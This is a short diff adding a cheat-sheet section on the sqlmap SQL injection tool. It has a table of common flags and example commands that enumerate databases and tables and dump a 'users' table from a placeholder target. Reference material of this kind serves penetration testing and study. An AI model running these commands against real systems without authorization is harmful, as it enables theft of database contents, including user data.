@@ -1,0 +1,33 @@
+=== sqlmap
+_SQL injection_
+
+sqlmap automates SQL injection attacks.
+
+==== Common Flags
+
+[cols="1,3", options="header"]
+|===
+|Flag               |Description
+|`-u http://target` |Location of vulnerability on the target
+|`--dbs`            |Enumerate databases
+|`-D db`            |Filter to only this database
+|`--tables`         |Enumerate tables
+|`-T table`         |Filter to only this table
+|`--dump`           |Dump all tables from all databases filtered
+|===
+
+==== Common Usage
+
+  sqlmap -u http://target/?id=1 --dbs
+
+Get all databases.
+
+  sqlmap -u http://target/?id=1 -D blog --tables
+
+Get all tables in the blog database.
+
+  sqlmap -u http://target/?id=1 -D blog -T users --dump
+
+Get all rows in the user table in the blog database.
+
+<<<
